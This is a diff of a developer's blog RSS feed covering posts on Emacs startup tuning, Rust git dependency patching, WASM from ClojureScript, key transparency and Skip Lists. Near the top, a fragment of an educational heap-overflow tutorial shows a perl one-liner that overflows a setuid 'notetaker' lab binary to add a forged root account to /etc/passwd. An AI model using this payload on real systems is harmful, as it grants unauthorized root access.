 &lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#stack-vs-heap-based-buffer-overflows&quot;&gt;Stack vs Heap-based buffer
 overflows?&lt;/a&gt;&lt;/li&gt;
@@ -2703,7 +2672,7 @@ sudo chown root:root notetaker
 sudo chmod u+s notetaker
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;We can write to whatever file we want, &lt;code&gt;testfile&lt;/code&gt; for example.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/heap-based-buffer-overflow/create-testfile.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We exploited it!&lt;/p&gt;
 &lt;h1&gt;Bonus points&lt;/h1&gt;
 &lt;p&gt;The exercise is helpful but dull. We can do something more interesting
@@ -2739,14 +2708,45 @@ the entry as &lt;code&gt;newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/tmp/etc/passw
 The last step is to make it longer to overflow the buffer.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;./notetaker $(perl -e &apos;print &quot;newrootuser:AA3BKXQMdIWHE:0:0:&quot;, &quot;A&quot; x 71, &quot;:/root:/tmp/etc/passwd&quot;&apos;)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/heap-based-buffer-overflow/root-access.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;Exploiting heap and stack buffer overflows has the same difficulty.
 Everything we know about one variant can be applied to the other (as far
 as I know). They are easy to exploit and protect. However, software
 engineers should be aware of their existence and how to avoid them.
 There is no excuse for avoiding them in your programs!&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/heap-overflow.CvuaMumU.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to use WASM code from ClojureScript through JavaScript interop</title><link>https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</guid><description>Learn to use WASM code in ClojureScript via JavaScript interop. Explore Rust functions, wasm-bindgen crate, and seamless integration with JS for efficient coding.</description><pubDate>Sat, 10 Jun 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Clojure is a great programming language. I have been working with it
+</content:encoded><image>https://danielorihuela.dev/_astro/heap-overflow.CvuaMumU.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to patch a git dependency in rust with same location but different branch</title><link>https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-patch-a-git-dependency-in-rust-with-same-location-but-different-branch/</guid><description>Learn to patch Rust git dependencies using different branches with the same repository.</description><pubDate>Mon, 29 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;At my current employer, we are developing multiple internal libraries in
+Rust. They are hosted in a git based code hosting.
+&lt;a href=&quot;https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html#specifying-dependencies-from-git-repositories&quot;&gt;Here&lt;/a&gt;
+is how we can specify them from a different repository.&lt;/p&gt;
+&lt;p&gt;Sometimes we want to modify a repository (we will call it &quot;Start&quot;) that
+happens to be one of the lowest dependencies in the tree. And we want to
+test that a specific repository (we will call it &quot;End&quot;) that uses the
+&quot;Start&quot; dependency indirectly still works. For instance, we could have
+the following chain of dependencies: &quot;End&quot; -&amp;gt; &quot;A&quot; -&amp;gt; &quot;B&quot; -&amp;gt; &quot;C&quot; -&amp;gt;
+&quot;Start&quot;, where &quot;-&amp;gt;&quot; represents a dependency.&lt;/p&gt;
+&lt;p&gt;Rust allows to &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;override
+dependencies&lt;/a&gt;, but it
+does not work in all situations. For instance, it &lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478&quot;&gt;does not allow
+patching a git repository using a different branch of the same
+repository&lt;/a&gt;. The
+&lt;a href=&quot;https://github.com/rust-lang/cargo/issues/5478#issuecomment-1506056467&quot;&gt;fix&lt;/a&gt;
+is simple but easy to misconfigure. I have problems configuring it every
+time I need to do it.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[patch.&apos;https://github.com/company/Start&apos;]
+start = { git = &quot;https://www.github.com/company//Start.git&quot;, branch = &quot;new-feature&quot; }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There are two important details there.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The patch url does not include the trailing &quot;.git&quot;&lt;/li&gt;
+&lt;li&gt;The url in the second line contains &quot;//&quot; before &quot;Start.git&quot;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Without these two things, you will end with the following error:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Caused by:
+  patch for `start` in `https://github.com/company/Start` points to the same source, but patches must point
+  to different sources
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/patch-dependency.BXipaHaQ.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>How to use WASM code from ClojureScript through JavaScript interop</title><link>https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/</guid><description>Learn to use WASM code in ClojureScript via JavaScript interop. Explore Rust functions, wasm-bindgen crate, and seamless integration with JS for efficient coding.</description><pubDate>Sat, 10 Jun 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Clojure is a great programming language. I have been working with it
 lately, and it&apos;s been a blast. Another language that I love is Rust. One
 day I was thinking about both languages, their advantages and
 disadvantages, and under which circumstances I should use each. That
@@ -2796,18 +2796,18 @@ website.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;clj -M --main cljs.main --compile hello-world.core --repl
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;But there&apos;s one problem.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/browser-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;The wasm file cannot be validated. I suspect it is related to Will
 Cohen&apos;s comment on &lt;a href=&quot;https://clojure.atlassian.net/browse/CLJS-3387&quot;&gt;https://clojure.atlassian.net/browse/CLJS-3387&lt;/a&gt;. So
 I tried to serve it with
 &lt;a href=&quot;https://github.com/svenstaro/miniserve&quot;&gt;miniserve&lt;/a&gt;. It worked!&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/no-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We can call WASM code with with the following approach: The
 &lt;a href=&quot;https://cljs.info/cheatsheet/&quot;&gt;cheatsheet&lt;/a&gt; tells us how to access the
 function we jsut exported.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;(. js/window (addWasm 5 10))
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/how-to-use-wasm-code-from-clojurescript-through-javascript-interop/result.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;You can check the final code at
 &lt;a href=&quot;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&quot;&gt;https://github.com/danielorihuela/wasm-on-clojurescript-through-js-interop&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;And this is how we can call WASM from ClojureScript from a basic
@@ -2884,7 +2884,7 @@ node is in the tree. For example, to check that the tree includes the
 hash in red, we only need the hashes in green. Computing the hashes in a
 bottom up fashion with the read and green hashes should give us the same
 root hash.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/merkle-tree.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That&apos;s fast and easy to verify, can be done in the client&apos;s device and
 allows any user to check that a specific public key is registered in the
 service. This Merkle Tree is computed from time to time, so we end with
@@ -2928,7 +2928,7 @@ each new key due to scalability issues. It&apos;s done after specific time
 intervals (e.g. every 5 minutes). When the time is right, the server
 creates a snapshot of that epoch. That includes all the new keys added
 in the last batch.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/register-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Lookup phase&lt;/h3&gt;
 &lt;ol&gt;
 &lt;li&gt;Alice asks for the public key of Bob&lt;/li&gt;
@@ -2939,15 +2939,15 @@ in the Merkle Tree)&lt;/li&gt;
 &lt;p&gt;Alice knows the given public key is inside the Merkle Tree and trusts
 that it&apos;s Bob&apos;s public key. If it wasn&apos;t, Bob should have notice and
 raised an alarm somewhere.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/lookup-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Monitoring phase&lt;/h3&gt;
 &lt;p&gt;It works the same as the lookup phase. Alice checks that the service
 gives her key when someone asks for her public key. Otherwise he can
 raise the alarm to her contacts.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/monitoring-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Cross verification phase&lt;/h3&gt;
 &lt;p&gt;Client asks to different providers to verify the Merkle Tree chain.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/cross-verification-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Some thoughts&lt;/h2&gt;
 &lt;p&gt;Pretty cool, right? It&apos;s a good step forward to improve public key
 distribution. However, it has it&apos;s
@@ -2971,12 +2971,12 @@ are the same, but the phases change a bit.&lt;/p&gt;
 &lt;h2&gt;Protocol phases&lt;/h2&gt;
 &lt;h3&gt;Registration phase&lt;/h3&gt;
 &lt;p&gt;It works the same as in CONIKS.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/whatsapp-register-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Lookup phase&lt;/h3&gt;
 &lt;p&gt;Similar to CONIKS. However, the client first asks for the root hash of
 the last published epoch. Then, the client asks WhatsApp for the public
 key included in the Merklee Tree with that root hash.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/key-transparency-high-level/whatsapp-lookup-phase.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Challenges&lt;/h2&gt;
 &lt;p&gt;We can learn a lot from WhatsApp implementation, especially from the
 challenges they had to face.&lt;/p&gt;
@@ -3003,110 +3003,7 @@ challenges in the future.&lt;/p&gt;
 on public key distributions along with some challenges. Google and
 WhatsApp seem to be doing some work on those areas. Keep a look on
 them!!!&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/key-transparency.degZT15k.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Optimize emacs start up time</title><link>https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</guid><description>Frustrated with Emacs start-up times? Discover simple hacks to speed things up and enhance your workflow in this guide.</description><pubDate>Sat, 18 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#optimization-steps&quot;&gt;Optimization steps&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#base-configuration&quot;&gt;Base configuration&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#dont-manipulate-ui-in-init.el&quot;&gt;Don&apos;t manipulate UI in init.el&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#garbage-collector&quot;&gt;Garbage collector&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#disable-ui&quot;&gt;Disable UI&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#autoload-packages&quot;&gt;Autoload packages&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#tangle-org-file&quot;&gt;Tangle org file&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h1&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;Emacs is a great tool. However, its loading time can grow huge. In this
-post, I&apos;ll show you some configurations that helped me reduce the start
-up time from &lt;strong&gt;~2.45s&lt;/strong&gt; to &lt;strong&gt;~0.81s&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1&gt;Optimization steps&lt;/h1&gt;
-&lt;p&gt;To make it more interesting, I&apos;m going to add a section for each
-optimization along with the time it saved me. That way, you can decide
-which optimizations you would like to apply.&lt;/p&gt;
-&lt;h2&gt;Base configuration&lt;/h2&gt;
-&lt;p&gt;The &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;base
-configuration&lt;/a&gt;
-requires ~2.45s to initialize Emacs. If you check it, be aware that I&apos;m
-not tangling the section &lt;strong&gt;Writing Research in LaTeX&lt;/strong&gt;. If you tangle
-it, it needs even more time to load. That&apos;s the starting point.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Don&apos;t manipulate UI in init.el&lt;/h2&gt;
-&lt;p&gt;Manipulating the UI is expensive: disabling UI elements, modifying the
-font, the theme, etc. I changed a couple of things related to the UI.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;Remove the code that hides some of the default UI elements from
-Emacs.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(scroll-bar-mode -1)
-(tool-bar-mode -1)
-(tooltip-mode -1)
-(menu-bar-mode -1)
-(column-number-mode)
-(set-face-attribute &apos;default nil :height 180)
-(toggle-frame-maximized)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Remove the code that loads the theme.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(use-package flatland-theme
-  :config
-  (load-theme &apos;flatland t))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;With that, we go down to ~2s.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Garbage collector&lt;/h2&gt;
-&lt;p&gt;Emacs uses 8MB as the default value for the garbage collector. As a
-result, Emacs will call the garbage collector too many times during the
-start up. Doom emacs has a trick to improve that. We need to add the
-following code to &lt;code&gt;early-init.el&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(setq gc-cons-threshold 63000000
-      gc-cons-percentage 0.6)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that, we go down to ~1.021s. Half the time from the previous step.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Disable UI&lt;/h2&gt;
-&lt;p&gt;We can hide some UI elements in the &lt;code&gt;early-init.el&lt;/code&gt; to gain some
-performance.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(push &apos;(menu-bar-lines . 0) default-frame-alist)
-(push &apos;(tool-bar-lines . 0) default-frame-alist)
-(push &apos;(vertical-scroll-bars) default-frame-alist)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that, we go down to ~0.92s.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Autoload packages&lt;/h2&gt;
-&lt;p&gt;Never &lt;code&gt;require&lt;/code&gt; packages. Use &lt;code&gt;use-package&lt;/code&gt; to autoload them. For
-example, we can load the &lt;code&gt;magit&lt;/code&gt; the first time we call &lt;code&gt;magit-status&lt;/code&gt;.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(use-package magit
-  :bind (&quot;C-x g&quot; . magit-status))
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that, we go down to ~0.91s. It&apos;s anecdotal in my case, but it can
-save you a lot of time if you are using dozens or hundreds of packages.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Tangle org file&lt;/h2&gt;
-&lt;p&gt;Normally, Emacs reads the configuration from the &lt;code&gt;init.el&lt;/code&gt; file.
-However, we can use org mode to include comments with the code.
-Personally, I had my configuration in a file called &lt;code&gt;config.org&lt;/code&gt;. I
-loaded it from my &lt;code&gt;init.el&lt;/code&gt; with the following line of code:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;(org-babel-load-file &quot;~/dotfiles/emacs/config.org&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;It&apos;s pretty convenient, but slow. We can make it faster by tangling the
-file directly into the &lt;code&gt;init.el&lt;/code&gt;. In other words, we can extract the
-source code blocks from the &lt;code&gt;org&lt;/code&gt; file and create the &lt;code&gt;init.el&lt;/code&gt; with
-them.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# -*- after-save-hook: (org-babel-tangle) -*-
-#+property: header-args:elisp :exports code :results none :tangle init.el
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;With that, we go down to ~0.82s and get the &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;final
-config&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h2&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;Emacs is easy to configure, but hard to optimize. Try all the tricks
-above and check for some more on the internet.&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/emacs-logo.DuuBcpPG.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Skip List (in Rust) explained!</title><link>https://danielorihuela.dev/blog/skip-list/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/skip-list/</guid><description>Understand Skip Lists in Rust. Simpler than balanced trees, they offer logarithmic operations but use more memory. Learn their structure and how to implement them.</description><pubDate>Sat, 18 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/key-transparency.degZT15k.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Skip List (in Rust) explained!</title><link>https://danielorihuela.dev/blog/skip-list/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/skip-list/</guid><description>Understand Skip Lists in Rust. Simpler than balanced trees, they offer logarithmic operations but use more memory. Learn their structure and how to implement them.</description><pubDate>Sat, 18 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#whats-a-skip-list&quot;&gt;What&apos;s a Skip List?&lt;/a&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#search&quot;&gt;Search&lt;/a&gt;&lt;/li&gt;
@@ -3131,7 +3028,7 @@ memory.&lt;/p&gt;
 &lt;p&gt;Regarding the structure, a Skip List is no more than &quot;n&quot; linked lists.
 Conceptually, they are stacked on top of each other. For example, the
 next image shows a Skip List with four layers.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/skip-list/basic-structure.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Let&apos;s briefly explain how each of the operations works at a high level.
 To know all the details, please, read the &lt;a href=&quot;https://15721.courses.cs.cmu.edu/spring2018/papers/08-oltpindexes1/pugh-skiplists-cacm1990.pdf&quot;&gt;original
 whitepaper&lt;/a&gt;.
@@ -3144,7 +3041,7 @@ the bottommost layer. We just need to check if this node contains the
 value that we want.&lt;/p&gt;
 &lt;p&gt;You can see on the next image, marked with a red line, the path the
 algorithm will follow to search for node 762.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/skip-list/search.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;If we search 700, the algorithm would follow the same path until node
 641. Since the next node value is 762, which is bigger, it wouldn&apos;t find
 the value.&lt;/p&gt;
@@ -3161,7 +3058,7 @@ image. It would store nodes with values None, 446, and 641. The new node
 will be inserted between 641 and 762. Then, we proceed to visit node 641
 and randomly choose if the new node should be a successor. We repeat
 that for 446 and None if required.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/skip-list/insert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Delete&lt;/h2&gt;
 &lt;p&gt;This is similar to the insert algorithm. Now, instead of adding a new
 node, we will visit each node where we went downwards and update the
@@ -3295,7 +3192,214 @@ struct Node&amp;lt;T&amp;gt; {
     }
 }
 &lt;/code&gt;&lt;/pre&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/skip-list.BnqtRHBJ.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Stack-based buffer overflows</title><link>https://danielorihuela.dev/blog/stack-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/stack-based-buffer-overflows/</guid><description>Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Fri, 20 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/skip-list.BnqtRHBJ.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Optimize emacs start up time</title><link>https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/optimize-emacs-start-up-time/</guid><description>Frustrated with Emacs start-up times? Discover simple hacks to speed things up and enhance your workflow in this guide.</description><pubDate>Sat, 18 Nov 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#optimization-steps&quot;&gt;Optimization steps&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#base-configuration&quot;&gt;Base configuration&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#dont-manipulate-ui-in-init.el&quot;&gt;Don&apos;t manipulate UI in init.el&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#garbage-collector&quot;&gt;Garbage collector&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#disable-ui&quot;&gt;Disable UI&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#autoload-packages&quot;&gt;Autoload packages&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#tangle-org-file&quot;&gt;Tangle org file&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Emacs is a great tool. However, its loading time can grow huge. In this
+post, I&apos;ll show you some configurations that helped me reduce the start
+up time from &lt;strong&gt;~2.45s&lt;/strong&gt; to &lt;strong&gt;~0.81s&lt;/strong&gt;.&lt;/p&gt;
+&lt;h1&gt;Optimization steps&lt;/h1&gt;
+&lt;p&gt;To make it more interesting, I&apos;m going to add a section for each
+optimization along with the time it saved me. That way, you can decide
+which optimizations you would like to apply.&lt;/p&gt;
+&lt;h2&gt;Base configuration&lt;/h2&gt;
+&lt;p&gt;The &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;base
+configuration&lt;/a&gt;
+requires ~2.45s to initialize Emacs. If you check it, be aware that I&apos;m
+not tangling the section &lt;strong&gt;Writing Research in LaTeX&lt;/strong&gt;. If you tangle
+it, it needs even more time to load. That&apos;s the starting point.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/base.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Don&apos;t manipulate UI in init.el&lt;/h2&gt;
+&lt;p&gt;Manipulating the UI is expensive: disabling UI elements, modifying the
+font, the theme, etc. I changed a couple of things related to the UI.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Remove the code that hides some of the default UI elements from
+Emacs.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(scroll-bar-mode -1)
+(tool-bar-mode -1)
+(tooltip-mode -1)
+(menu-bar-mode -1)
+(column-number-mode)
+(set-face-attribute &apos;default nil :height 180)
+(toggle-frame-maximized)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Remove the code that loads the theme.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(use-package flatland-theme
+  :config
+  (load-theme &apos;flatland t))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;With that, we go down to ~2s.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/no-ui.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Garbage collector&lt;/h2&gt;
+&lt;p&gt;Emacs uses 8MB as the default value for the garbage collector. As a
+result, Emacs will call the garbage collector too many times during the
+start up. Doom emacs has a trick to improve that. We need to add the
+following code to &lt;code&gt;early-init.el&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(setq gc-cons-threshold 63000000
+      gc-cons-percentage 0.6)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that, we go down to ~1.021s. Half the time from the previous step.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/early-init-gc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Disable UI&lt;/h2&gt;
+&lt;p&gt;We can hide some UI elements in the &lt;code&gt;early-init.el&lt;/code&gt; to gain some
+performance.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(push &apos;(menu-bar-lines . 0) default-frame-alist)
+(push &apos;(tool-bar-lines . 0) default-frame-alist)
+(push &apos;(vertical-scroll-bars) default-frame-alist)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that, we go down to ~0.92s.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/early-init-disable-ui.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Autoload packages&lt;/h2&gt;
+&lt;p&gt;Never &lt;code&gt;require&lt;/code&gt; packages. Use &lt;code&gt;use-package&lt;/code&gt; to autoload them. For
+example, we can load the &lt;code&gt;magit&lt;/code&gt; the first time we call &lt;code&gt;magit-status&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(use-package magit
+  :bind (&quot;C-x g&quot; . magit-status))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With that, we go down to ~0.91s. It&apos;s anecdotal in my case, but it can
+save you a lot of time if you are using dozens or hundreds of packages.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/config-org-autoload.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Tangle org file&lt;/h2&gt;
+&lt;p&gt;Normally, Emacs reads the configuration from the &lt;code&gt;init.el&lt;/code&gt; file.
+However, we can use org mode to include comments with the code.
+Personally, I had my configuration in a file called &lt;code&gt;config.org&lt;/code&gt;. I
+loaded it from my &lt;code&gt;init.el&lt;/code&gt; with the following line of code:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(org-babel-load-file &quot;~/dotfiles/emacs/config.org&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It&apos;s pretty convenient, but slow. We can make it faster by tangling the
+file directly into the &lt;code&gt;init.el&lt;/code&gt;. In other words, we can extract the
+source code blocks from the &lt;code&gt;org&lt;/code&gt; file and create the &lt;code&gt;init.el&lt;/code&gt; with
+them.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# -*- after-save-hook: (org-babel-tangle) -*-
+#+property: header-args:elisp :exports code :results none :tangle init.el
+&lt;/code&gt;&lt;/pre&gt;
